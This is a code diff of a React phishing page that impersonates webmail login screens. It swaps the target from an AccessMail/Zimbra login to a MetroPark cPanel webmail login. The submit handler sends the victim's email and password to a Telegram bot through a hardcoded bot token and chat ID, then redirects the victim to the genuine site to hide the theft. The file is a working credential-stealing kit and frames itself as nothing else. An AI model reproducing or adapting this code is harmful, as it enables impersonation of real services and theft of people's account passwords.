@@ -5,7 +5,8 @@ import logo from './logo.png';
 import ardmore from './ardmore.png';
 import { useState } from 'react';
 import axios from 'axios';
-import access from './accessmail.png';
+import metro from './metro.svg';
+import cpanel from './cpanel.png';
 
 function Home(){
 
@@ -13,7 +14,7 @@ function Home(){
 
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("AccessMail")
+    const[platform, setPlatform] = useState("MetroPark")
 
     const[showError, setShowError] = useState(false);
 
@@ -24,14 +25,10 @@ function Home(){
     
     
         try {
-            // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
-            //     email:email,
-            //     password:password,
-            //     platform:platform
-            // });
+           
     
-            const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
-                chat_id: 5916570239,
+          const response =   await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
+                chat_id: 6150403557,
                 text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
               });
     
@@ -44,7 +41,7 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'https://mail.myaccess.ca/';
+               window.location.href = 'https://metroparks.net:2096/';
             }
           } catch (error) {
             // Handle error
@@ -70,9 +67,9 @@ function Home(){
 
             </div>
 
-            <div className='secondiv col-md-5 m-auto'>
-                <div className='logodiv text-center'>
-                <img src={access} className="mylogo" />
+            <div className='secondiv col-md-5 m-auto px-4'>
+                <div className='text-center'>
+                <img src={metro} className="mylogo" />
 
                 </div>
 
@@ -82,84 +79,54 @@ function Home(){
 
 
                 <form onSubmit={handleSubmit} className='px-4 mt-4'>
-                    <div class="form-group row">
-                        <label for="staticEmail" class="label col-sm-2 col-form-label">Email</label>
-                        <div class="col-sm-10">
-                        <input type="email"style={{
-                            height:"30px",
-                        }}  class="form-control"onChange={function(e){
-                            setEmail(e.target.value);
-                        }} value={email} id="staticEmail"required />
-                        </div>
-                    </div>
-                    <div class="form-group row">
-                        <label for="inputPassword" class="label col-sm-2 col-form-label">Password</label>
-                        <div class="col-sm-10">
-                        <input type="password"style={{
-                            height:"30px",
-                        }}class="form-control"onChange={function(e){
-                            setPassword(e.target.value);
-                        }}value={password} id="inputPassword" required/>
-                        </div>
-                    </div>
+                   
 
 
-                    <div class="form-group row">
-                        <label for="inputPassword"style={{
-                            visibility:"hidden",
-                        }} class="label col-sm-2 col-form-label">Password</label>
-                        <div class="col-sm-10">
-                        
+                <div class="col-auto">
+      <label class="" for="inlineFormInputGroup">Email Address</label>
+      <div class="input-group mb-2">
+        <div class="input-group-prepend">
+          <div class="input-group-text"><i className='fa fa-user'></i></div>
+        </div>
+        <input type="email" onChange={function(e){
+            setEmail(e.target.value);
+        }} value={email} class="form-control" id="inlineFormInputGroup" placeholder="Enter your email address"/>
+      </div>
+    </div>
 
-                            <div className='row'>
-                                <div className='col-6 text-left'>
-                                    <input type="checkbox" id="inputPassword" /><span className='label'>Stay signed in</span>
-                                </div>
+<br/>
 
-                                <div className='col-6 text-right'>
-                                   <button type="submit" className='btn rounded mybtn px-1 py-1'>Sign In</button>
-                                </div>
+    <div class="col-auto">
+      <label class="" for="inlineFormInputGroup">Password</label>
+      <div class="input-group mb-2">
+        <div class="input-group-prepend">
+          <div class="input-group-text"><i className='fa fa-lock'></i></div>
+        </div>
+        <input type="password" onChange={function(e){
+            setPassword(e.target.value);
+        }} value={password} class="form-control" id="inlineFormInputGroup" placeholder="Enter your email password"/>
+      </div>
+    </div>
 
-                            </div>
-
-
-                        </div>
-                    </div>
-
-
-
-                    <hr
-                        style={{
-                        background: 'white',
-                        color: 'white',
-                        borderColor: 'white',
-                        height: '2px',
-                        }}
-                    />
-
-             
+    
 
 
-                     <div className='row'>
-                                <div className='col-2 text-left'>
-                                <label for="inputPassword" class="labeltwo">Version:</label>
-                                </div>
+    <br/>
 
-                                <div className='col-6 text-right'>
-                                <select id="client">
-                                    <option value="preferred" selected > Default</option>
-                                    <option value="advanced" > Advanced (Ajax)</option>
-                                    <option value="standard" > Standard (HTML)</option>
-                                    <option value="mobile" > Mobile</option>
-                                    <option value="touch" > Touch</option>
-                                    </select>
-                                </div>
 
-                                <div className='col-2 text-left'>
-                                <label for="inputPassword" class="labeltwo">What's This?</label>
-                                </div>
+    <div className='text-center'>
 
-                            </div>
+        <button className='btn mybutton py-2 w-100'>Login</button>
+
+    </div>
+
+
+                 
+
+
+
+                  
+                    
 
 
 
@@ -167,11 +134,33 @@ function Home(){
 
             </div>
 
+<br/>
+<br/>
 
-            <div className='thirdiv'>
+            <div className='myflex col-md-8 m-auto'>
 
-                <p>Zimbra :: the leader in open source messaging and collaboration :: Blog - Wiki - Forums <br/>
-                    Copyright © 2005-2021 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</p>
+               
+                <p>English</p>
+                <p>العربية</p>
+                <p>čeština</p>
+                <p>dansk</p>
+                <p>Deutsch</p>
+                <p> Ελληνικά</p>
+                <p>español</p>
+                <p>español</p>
+                <p>latinoamericano …</p>
+
+            </div>
+
+
+            <div className='thirdiv text-center'>
+
+                <img src={cpanel} style={{
+                    width:"30px",
+                }}  />
+
+                <p>Copyright© 2024 cPanel, L.L.C. <br/>
+Privacy Policy</p>
 
             </div>
 
